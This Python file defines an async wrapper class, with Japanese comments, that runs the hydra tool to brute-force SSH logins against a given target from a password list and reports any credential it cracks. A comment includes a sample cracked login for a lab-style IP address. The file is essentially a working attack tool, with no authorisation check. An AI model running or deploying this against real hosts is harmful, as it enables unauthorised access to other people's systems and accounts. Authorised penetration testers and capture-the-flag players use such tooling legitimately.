import asyncio
from typing import Dict, List, Optional
import re

class HydraScanner:
    """hydraを使用してブルートフォース攻撃を実行するスキャナー"""

    def __init__(self):
        # タイムアウトや並列実行数などのデフォルト設定
        self.timeout = 30
        self.tasks = 4

    async def ssh_brute_force(self, target: str, port: int, username: str, password_list_path: str) -> str:
        """SSHに対してパスワードリスト攻撃を実行します。"""

        # hydraコマンドを安全なリスト形式で構築
        cmd_parts = [
            "hydra",
            "-t", str(self.tasks),
            "-W", str(self.timeout),
            "-l", username,
            "-P", password_list_path,
            f"ssh://{target}:{port}"
        ]

        # サブプロセスとしてhydraコマンドを実行
        process = await asyncio.create_subprocess_exec(
            *cmd_parts,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await process.communicate()
        
        output = stdout.decode('utf-8', errors='ignore').strip()
        error_output = stderr.decode('utf-8', errors='ignore').strip()

        # hydraの出力を解析してパスワードを見つける
        # 例: [22][ssh] host: 10.10.13.152   login: lin   password: RedDr@gonSyn9ic47e
        password_pattern = re.compile(r'password:\s*(.*)')
        found_password = None
        
        for line in output.splitlines():
            if "host:" in line and "login:" in line and "password:" in line:
                match = password_pattern.search(line)
                if match:
                    found_password = match.group(1).strip()
                    break
        
        if found_password:
            return f"✅ SUCCESS: Password found!\n  - Host: {target}\n  - Port: {port}\n  - User: {username}\n  - Password: {found_password}"
        elif process.returncode != 0:
            return f"❌ FAILED: hydra command failed.\nError: {error_output or output}"
        else:
            return "❌ FAILED: Password not found in the provided list."

    async def get_status(self) -> str:
        """Hydra Scannerの状態確認"""
        # hydraがインストールされているか簡単なチェック
        process = await asyncio.create_subprocess_shell("hydra -h", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        await process.communicate()
        if process.returncode == 0:
            return "Available"
        else:
            return "Not available (hydra command not found)"